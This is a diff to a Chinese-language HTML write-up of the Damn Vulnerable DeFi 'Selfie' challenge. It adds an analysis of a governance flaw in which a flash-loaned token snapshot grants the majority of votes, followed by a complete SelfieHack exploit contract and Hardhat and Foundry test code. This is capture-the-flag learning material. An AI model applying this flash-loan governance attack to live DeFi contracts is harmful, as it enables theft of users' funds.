@@ -2688,6 +2688,46 @@
   
 </li>
       
+        <li class="md-nav__item">
+  <a href="#6-selfie" class="md-nav__link">
+    6. Selfie
+  </a>
+  
+    <nav class="md-nav" aria-label="6. Selfie">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#exploit_3" class="md-nav__link">
+    Exploit
+  </a>
+  
+    <nav class="md-nav" aria-label="Exploit">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#hardhat_1" class="md-nav__link">
+    Hardhat
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#foundry_1" class="md-nav__link">
+    Foundry
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
     </ul>
   
 </nav>
@@ -2993,6 +3033,46 @@
   
 </li>
       
+        <li class="md-nav__item">
+  <a href="#6-selfie" class="md-nav__link">
+    6. Selfie
+  </a>
+  
+    <nav class="md-nav" aria-label="6. Selfie">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#exploit_3" class="md-nav__link">
+    Exploit
+  </a>
+  
+    <nav class="md-nav" aria-label="Exploit">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#hardhat_1" class="md-nav__link">
+    Hardhat
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#foundry_1" class="md-nav__link">
+    Foundry
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
     </ul>
   
 </nav>
@@ -3065,6 +3145,7 @@ $<span class="w"> </span>yarn<span class="w"> </span>install
 <div class="highlight"><pre><span></span><code>$<span class="w"> </span>git<span class="w"> </span>clone<span class="w"> </span>git@github.com:StErMi/forge-damn-vulnerable-defi.git
 $<span class="w"> </span><span class="nb">cd</span><span class="w"> </span>forge-damn-vulnerable-defi
 $<span class="w"> </span>git<span class="w"> </span>submodule<span class="w"> </span>update<span class="w"> </span>--init<span class="w"> </span>--recursive
+$<span class="w"> </span>forge<span class="w"> </span>remappings
 </code></pre></div>
 <ul>
 <li>Code solution under the <code>src/test</code></li>
@@ -3474,13 +3555,166 @@ $<span class="w"> </span>git<span class="w"> </span>submodule<span class="w"> </
 <ul>
 <li><a href="https://docs.openzeppelin.com/contracts/4.x/api/token/erc20#ERC20Snapshot">ERC20Snapshot</a></li>
 </ul>
+<h2 id="6-selfie">6. Selfie<a class="headerlink" href="#6-selfie" title="Permanent link">&para;</a></h2>
+<blockquote>
+<p>A new cool lending pool has launched! It’s now offering flash loans of DVT tokens. It even includes a fancy governance mechanism to control it.</p>
+<p>You start with no DVT tokens in balance, and the pool has 1.5 million. Your goal is to take them all.</p>
+</blockquote>
+<ul>
+<li>
+<p><code>governance</code> 才能调用 <code>emergencyExit()</code> 转出 pool 中的资金</p>
+<div class="highlight"><pre><span></span><code><span class="nx">modifier</span><span class="w"> </span><span class="nx">onlyGovernance</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="nx">address</span><span class="p">(</span><span class="nx">governance</span><span class="p">))</span>
+<span class="w">        </span><span class="nx">revert</span><span class="w"> </span><span class="nx">CallerNotGovernance</span><span class="p">();</span>
+<span class="w">    </span><span class="nx">_</span><span class="p">;</span>
+<span class="p">}</span>
+
+<span class="kd">function</span><span class="w"> </span><span class="nx">emergencyExit</span><span class="p">(</span><span class="nx">address</span><span class="w"> </span><span class="nx">receiver</span><span class="p">)</span><span class="w"> </span><span class="nx">external</span><span class="w"> </span><span class="nx">onlyGovernance</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="nx">uint256</span><span class="w"> </span><span class="nx">amount</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">token</span><span class="p">.</span><span class="nx">balanceOf</span><span class="p">(</span><span class="nx">address</span><span class="p">(</span><span class="k">this</span><span class="p">));</span>
+<span class="w">    </span><span class="nx">token</span><span class="p">.</span><span class="nx">transfer</span><span class="p">(</span><span class="nx">receiver</span><span class="p">,</span><span class="w"> </span><span class="nx">amount</span><span class="p">);</span>
+
+<span class="w">    </span><span class="nx">emit</span><span class="w"> </span><span class="nx">FundsDrained</span><span class="p">(</span><span class="nx">receiver</span><span class="p">,</span><span class="w"> </span><span class="nx">amount</span><span class="p">);</span>
+<span class="p">}</span>
+</code></pre></div>
+</li>
+<li>
+<p><code>SimpleGovernance.executeAction()</code> 可以执行自定义调用</p>
+<div class="highlight"><pre><span></span><code><span class="kd">function</span><span class="w"> </span><span class="nx">executeAction</span><span class="p">(</span><span class="nx">uint256</span><span class="w"> </span><span class="nx">actionId</span><span class="p">)</span><span class="w"> </span><span class="nx">external</span><span class="w"> </span><span class="nx">payable</span><span class="w"> </span><span class="nx">returns</span><span class="w"> </span><span class="p">(</span><span class="nx">bytes</span><span class="w"> </span><span class="nx">memory</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">_canBeExecuted</span><span class="p">(</span><span class="nx">actionId</span><span class="p">))</span>
+<span class="w">        </span><span class="nx">revert</span><span class="w"> </span><span class="nx">CannotExecute</span><span class="p">(</span><span class="nx">actionId</span><span class="p">);</span>
+
+<span class="w">    </span><span class="nx">GovernanceAction</span><span class="w"> </span><span class="nx">storage</span><span class="w"> </span><span class="nx">actionToExecute</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">_actions</span><span class="p">[</span><span class="nx">actionId</span><span class="p">];</span>
+<span class="w">    </span><span class="nx">actionToExecute</span><span class="p">.</span><span class="nx">executedAt</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">uint64</span><span class="p">(</span><span class="nx">block</span><span class="p">.</span><span class="nx">timestamp</span><span class="p">);</span>
+
+<span class="w">    </span><span class="nx">emit</span><span class="w"> </span><span class="nx">ActionExecuted</span><span class="p">(</span><span class="nx">actionId</span><span class="p">,</span><span class="w"> </span><span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">);</span>
+
+<span class="w">    </span><span class="p">(</span><span class="nx">bool</span><span class="w"> </span><span class="nx">success</span><span class="p">,</span><span class="w"> </span><span class="nx">bytes</span><span class="w"> </span><span class="nx">memory</span><span class="w"> </span><span class="nx">returndata</span><span class="p">)</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">actionToExecute</span><span class="p">.</span><span class="nx">target</span><span class="p">.</span><span class="nx">call</span><span class="p">{</span><span class="nx">value</span><span class="o">:</span><span class="w"> </span><span class="nx">actionToExecute</span><span class="p">.</span><span class="nx">value</span><span class="p">}(</span><span class="nx">actionToExecute</span><span class="p">.</span><span class="nx">data</span><span class="p">);</span>
+<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="o">!</span><span class="nx">success</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="nx">returndata</span><span class="p">.</span><span class="nx">length</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="mf">0</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">            </span><span class="nx">assembly</span><span class="w"> </span><span class="p">{</span>
+<span class="w">                </span><span class="nx">revert</span><span class="p">(</span><span class="nx">add</span><span class="p">(</span><span class="mh">0x20</span><span class="p">,</span><span class="w"> </span><span class="nx">returndata</span><span class="p">),</span><span class="w"> </span><span class="nx">mload</span><span class="p">(</span><span class="nx">returndata</span><span class="p">))</span>
+<span class="w">            </span><span class="p">}</span>
+<span class="w">        </span><span class="p">}</span><span class="w"> </span><span class="k">else</span><span class="w"> </span><span class="p">{</span>
+<span class="w">            </span><span class="nx">revert</span><span class="w"> </span><span class="nx">ActionFailed</span><span class="p">(</span><span class="nx">actionId</span><span class="p">);</span>
+<span class="w">        </span><span class="p">}</span>
+<span class="w">    </span><span class="p">}</span>
+
+<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="nx">returndata</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div>
+</li>
+<li>
+<p>创建新的 action 需要创建者获取足够的票数，票数即创建者在上一快照 <code>governanceToken</code> 的持有量</p>
+<div class="highlight"><pre><span></span><code><span class="kd">function</span><span class="w"> </span><span class="nx">queueAction</span><span class="p">(</span><span class="nx">address</span><span class="w"> </span><span class="nx">target</span><span class="p">,</span><span class="w"> </span><span class="nx">uint128</span><span class="w"> </span><span class="nx">value</span><span class="p">,</span><span class="w"> </span><span class="nx">bytes</span><span class="w"> </span><span class="nx">calldata</span><span class="w"> </span><span class="nx">data</span><span class="p">)</span><span class="w"> </span><span class="nx">external</span><span class="w"> </span><span class="nx">returns</span><span class="w"> </span><span class="p">(</span><span class="nx">uint256</span><span class="w"> </span><span class="nx">actionId</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="o">!</span><span class="nx">_hasEnoughVotes</span><span class="p">(</span><span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">))</span>
+<span class="w">        </span><span class="nx">revert</span><span class="w"> </span><span class="nx">NotEnoughVotes</span><span class="p">(</span><span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">);</span>
+
+<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="nx">target</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="nx">address</span><span class="p">(</span><span class="k">this</span><span class="p">))</span>
+<span class="w">        </span><span class="nx">revert</span><span class="w"> </span><span class="nx">InvalidTarget</span><span class="p">();</span>
+
+<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="nx">data</span><span class="p">.</span><span class="nx">length</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="mf">0</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="nx">target</span><span class="p">.</span><span class="nx">code</span><span class="p">.</span><span class="nx">length</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="mf">0</span><span class="p">)</span>
+<span class="w">        </span><span class="nx">revert</span><span class="w"> </span><span class="nx">TargetMustHaveCode</span><span class="p">();</span>
+
+<span class="w">    </span><span class="nx">actionId</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">_actionCounter</span><span class="p">;</span>
+
+<span class="w">    </span><span class="nx">_actions</span><span class="p">[</span><span class="nx">actionId</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">GovernanceAction</span><span class="p">({</span>
+<span class="w">        </span><span class="nx">target</span><span class="o">:</span><span class="w"> </span><span class="nx">target</span><span class="p">,</span>
+<span class="w">        </span><span class="nx">value</span><span class="o">:</span><span class="w"> </span><span class="nx">value</span><span class="p">,</span>
+<span class="w">        </span><span class="nx">proposedAt</span><span class="o">:</span><span class="w"> </span><span class="nx">uint64</span><span class="p">(</span><span class="nx">block</span><span class="p">.</span><span class="nx">timestamp</span><span class="p">),</span>
+<span class="w">        </span><span class="nx">executedAt</span><span class="o">:</span><span class="w"> </span><span class="mf">0</span><span class="p">,</span>
+<span class="w">        </span><span class="nx">data</span><span class="o">:</span><span class="w"> </span><span class="nx">data</span>
+<span class="w">    </span><span class="p">});</span>
+
+<span class="w">    </span><span class="nx">unchecked</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="nx">_actionCounter</span><span class="o">++</span><span class="p">;</span><span class="w"> </span><span class="p">}</span>
+
+<span class="w">    </span><span class="nx">emit</span><span class="w"> </span><span class="nx">ActionQueued</span><span class="p">(</span><span class="nx">actionId</span><span class="p">,</span><span class="w"> </span><span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">);</span>
+<span class="p">}</span>
+
+<span class="kd">function</span><span class="w"> </span><span class="nx">_hasEnoughVotes</span><span class="p">(</span><span class="nx">address</span><span class="w"> </span><span class="nx">who</span><span class="p">)</span><span class="w"> </span><span class="kr">private</span><span class="w"> </span><span class="nx">view</span><span class="w"> </span><span class="nx">returns</span><span class="w"> </span><span class="p">(</span><span class="nx">bool</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="nx">uint256</span><span class="w"> </span><span class="nx">balance</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">_governanceToken</span><span class="p">.</span><span class="nx">getBalanceAtLastSnapshot</span><span class="p">(</span><span class="nx">who</span><span class="p">);</span>
+<span class="w">    </span><span class="nx">uint256</span><span class="w"> </span><span class="nx">halfTotalSupply</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">_governanceToken</span><span class="p">.</span><span class="nx">getTotalSupplyAtLastSnapshot</span><span class="p">()</span><span class="w"> </span><span class="o">/</span><span class="w"> </span><span class="mf">2</span><span class="p">;</span>
+<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="nx">balance</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="nx">halfTotalSupply</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div>
+</li>
+<li>
+<p>任何人都可以进行快照 uwu 那么在闪电贷时快照，即可获得充足的票数，在下一次快照前 <code>queueAction()</code> 就可以啦w</p>
+<div class="highlight"><pre><span></span><code><span class="kd">function</span><span class="w"> </span><span class="nx">snapshot</span><span class="p">()</span><span class="w"> </span><span class="kr">public</span><span class="w"> </span><span class="nx">returns</span><span class="w"> </span><span class="p">(</span><span class="nx">uint256</span><span class="w"> </span><span class="nx">lastSnapshotId</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="nx">lastSnapshotId</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">_snapshot</span><span class="p">();</span>
+<span class="w">    </span><span class="nx">_lastSnapshotId</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">lastSnapshotId</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div>
+</li>
+</ul>
+<h3 id="exploit_3">Exploit<a class="headerlink" href="#exploit_3" title="Permanent link">&para;</a></h3>
+<div class="highlight"><pre><span></span><code><span class="c1">// SPDX-License-Identifier: MIT</span>
+<span class="nx">pragma</span><span class="w"> </span><span class="nx">solidity</span><span class="w"> </span><span class="o">^</span><span class="mf">0.8.0</span><span class="p">;</span>
+
+<span class="k">import</span><span class="w"> </span><span class="s2">&quot;openzeppelin-contracts/interfaces/IERC3156FlashBorrower.sol&quot;</span><span class="p">;</span>
+<span class="k">import</span><span class="w"> </span><span class="s2">&quot;../DamnValuableTokenSnapshot.sol&quot;</span><span class="p">;</span>
+<span class="k">import</span><span class="w"> </span><span class="s2">&quot;./ISimpleGovernance.sol&quot;</span><span class="p">;</span>
+<span class="k">import</span><span class="w"> </span><span class="s2">&quot;./SelfiePool.sol&quot;</span><span class="p">;</span>
+
+<span class="nx">contract</span><span class="w"> </span><span class="nx">SelfieHack</span><span class="w"> </span><span class="nx">is</span><span class="w"> </span><span class="nx">IERC3156FlashBorrower</span><span class="w"> </span><span class="p">{</span>
+
+<span class="w">    </span><span class="kd">function</span><span class="w"> </span><span class="nx">exploit</span><span class="p">(</span><span class="nx">address</span><span class="w"> </span><span class="nx">instance</span><span class="p">,</span><span class="w"> </span><span class="nx">address</span><span class="w"> </span><span class="nx">pool</span><span class="p">)</span><span class="w"> </span><span class="nx">external</span><span class="w"> </span><span class="nx">returns</span><span class="w"> </span><span class="p">(</span><span class="nx">uint</span><span class="w"> </span><span class="nx">actionId</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">        </span><span class="nx">SelfiePool</span><span class="p">(</span><span class="nx">pool</span><span class="p">).</span><span class="nx">flashLoan</span><span class="p">(</span>
+<span class="w">            </span><span class="k">this</span><span class="p">,</span>
+<span class="w">            </span><span class="nx">address</span><span class="p">(</span><span class="nx">SelfiePool</span><span class="p">(</span><span class="nx">pool</span><span class="p">).</span><span class="nx">token</span><span class="p">()),</span>
+<span class="w">            </span><span class="mf">1500000</span><span class="w"> </span><span class="nx">ether</span><span class="p">,</span>
+<span class="w">            </span><span class="s2">&quot;&quot;</span>
+<span class="w">        </span><span class="p">);</span>
+<span class="w">        </span><span class="nx">actionId</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">ISimpleGovernance</span><span class="p">(</span><span class="nx">instance</span><span class="p">).</span><span class="nx">queueAction</span><span class="p">(</span>
+<span class="w">            </span><span class="nx">pool</span><span class="p">,</span>
+<span class="w">            </span><span class="mf">0</span><span class="p">,</span>
+<span class="w">            </span><span class="nx">abi</span><span class="p">.</span><span class="nx">encodeWithSignature</span><span class="p">(</span><span class="s2">&quot;emergencyExit(address)&quot;</span><span class="p">,</span><span class="w"> </span><span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">)</span>
+<span class="w">        </span><span class="p">);</span>
+<span class="w">    </span><span class="p">}</span>
+
+<span class="w">    </span><span class="kd">function</span><span class="w"> </span><span class="nx">onFlashLoan</span><span class="p">(</span>
+<span class="w">        </span><span class="nx">address</span><span class="p">,</span>
+<span class="w">        </span><span class="nx">address</span><span class="w"> </span><span class="nx">token</span><span class="p">,</span>
+<span class="w">        </span><span class="nx">uint256</span><span class="w"> </span><span class="nx">amount</span><span class="p">,</span>
+<span class="w">        </span><span class="nx">uint256</span><span class="p">,</span>
+<span class="w">        </span><span class="nx">bytes</span><span class="w"> </span><span class="nx">calldata</span>
+<span class="w">    </span><span class="p">)</span><span class="w"> </span><span class="nx">external</span><span class="w"> </span><span class="nx">returns</span><span class="w"> </span><span class="p">(</span><span class="nx">bytes32</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">        </span><span class="nx">DamnValuableTokenSnapshot</span><span class="p">(</span><span class="nx">token</span><span class="p">).</span><span class="nx">snapshot</span><span class="p">();</span>
+<span class="w">        </span><span class="nx">DamnValuableTokenSnapshot</span><span class="p">(</span><span class="nx">token</span><span class="p">).</span><span class="nx">approve</span><span class="p">(</span><span class="nx">msg</span><span class="p">.</span><span class="nx">sender</span><span class="p">,</span><span class="w"> </span><span class="nx">amount</span><span class="p">);</span>
+<span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="nx">keccak256</span><span class="p">(</span><span class="s2">&quot;ERC3156FlashBorrower.onFlashLoan&quot;</span><span class="p">);</span>
+<span class="w">    </span><span class="p">}</span>
+<span class="p">}</span>
+</code></pre></div>
+<h4 id="hardhat_1">Hardhat<a class="headerlink" href="#hardhat_1" title="Permanent link">&para;</a></h4>
+<div class="highlight"><pre><span></span><code><span class="nx">it</span><span class="p">(</span><span class="s1">&#39;Execution&#39;</span><span class="p">,</span><span class="w"> </span><span class="k">async</span><span class="w"> </span><span class="kd">function</span><span class="w"> </span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="kd">const</span><span class="w"> </span><span class="nx">SelfieHack</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">await</span><span class="w"> </span><span class="p">(</span><span class="k">await</span><span class="w"> </span><span class="nx">ethers</span><span class="p">.</span><span class="nx">getContractFactory</span><span class="p">(</span><span class="s1">&#39;SelfieHack&#39;</span><span class="p">,</span><span class="w"> </span><span class="nx">player</span><span class="p">)).</span><span class="nx">deploy</span><span class="p">();</span>
+<span class="w">    </span><span class="c1">// The return value of a non-pure non-view function is available only when the function is called and validated on-chain.</span>
+<span class="w">    </span><span class="k">await</span><span class="w"> </span><span class="nx">SelfieHack</span><span class="p">.</span><span class="nx">exploit</span><span class="p">(</span><span class="nx">governance</span><span class="p">.</span><span class="nx">address</span><span class="p">,</span><span class="w"> </span><span class="nx">pool</span><span class="p">.</span><span class="nx">address</span><span class="p">);</span><span class="w"> </span>
+
+<span class="w">    </span><span class="k">await</span><span class="w"> </span><span class="nx">ethers</span><span class="p">.</span><span class="nx">provider</span><span class="p">.</span><span class="nx">send</span><span class="p">(</span><span class="s2">&quot;evm_increaseTime&quot;</span><span class="p">,</span><span class="w"> </span><span class="p">[</span><span class="mf">2</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="mf">24</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="mf">60</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="mf">60</span><span class="p">]);</span>
+<span class="w">    </span><span class="k">await</span><span class="w"> </span><span class="nx">governance</span><span class="p">.</span><span class="nx">executeAction</span><span class="p">(</span><span class="k">await</span><span class="w"> </span><span class="nx">governance</span><span class="p">.</span><span class="nx">getActionCounter</span><span class="p">()</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="mf">1</span><span class="p">);</span>
+<span class="p">});</span>
+</code></pre></div>
+<h4 id="foundry_1">Foundry<a class="headerlink" href="#foundry_1" title="Permanent link">&para;</a></h4>
+<div class="highlight"><pre><span></span><code><span class="kd">function</span><span class="w"> </span><span class="nx">exploit</span><span class="p">()</span><span class="w"> </span><span class="nx">internal</span><span class="w"> </span><span class="nx">override</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="c1">// Sets attacker as msg.sender for all subsequent calls until stopPrank is called</span>
+<span class="w">    </span><span class="nx">vm</span><span class="p">.</span><span class="nx">startPrank</span><span class="p">(</span><span class="nx">attacker</span><span class="p">);</span>
+
+<span class="w">    </span><span class="nx">SelfieHack</span><span class="w"> </span><span class="nx">hack</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="ow">new</span><span class="w"> </span><span class="nx">SelfieHack</span><span class="p">();</span>
+<span class="w">    </span><span class="nx">uint</span><span class="w"> </span><span class="nx">actionId</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">hack</span><span class="p">.</span><span class="nx">exploit</span><span class="p">(</span><span class="nx">address</span><span class="p">(</span><span class="nx">governance</span><span class="p">),</span><span class="w"> </span><span class="nx">address</span><span class="p">(</span><span class="nx">pool</span><span class="p">));</span>
+
+<span class="w">    </span><span class="nx">vm</span><span class="p">.</span><span class="nx">stopPrank</span><span class="p">();</span>
+
+<span class="w">    </span><span class="nx">skip</span><span class="p">(</span><span class="nx">governance</span><span class="p">.</span><span class="nx">getActionDelay</span><span class="p">());</span><span class="w"> </span><span class="c1">// 2 days</span>
+<span class="w">    </span><span class="nx">governance</span><span class="p">.</span><span class="nx">executeAction</span><span class="p">(</span><span class="nx">actionId</span><span class="p">);</span>
+<span class="p">}</span>
+</code></pre></div>
 
   <hr>
 <div class="md-source-file">
   <small>
     
       最后更新:
-      <span class="git-revision-date-localized-plugin git-revision-date-localized-plugin-datetime">2023年4月1日 20:32:31</span>
+      <span class="git-revision-date-localized-plugin git-revision-date-localized-plugin-datetime">2023年4月2日 21:50:04</span>
       
     
   </small>
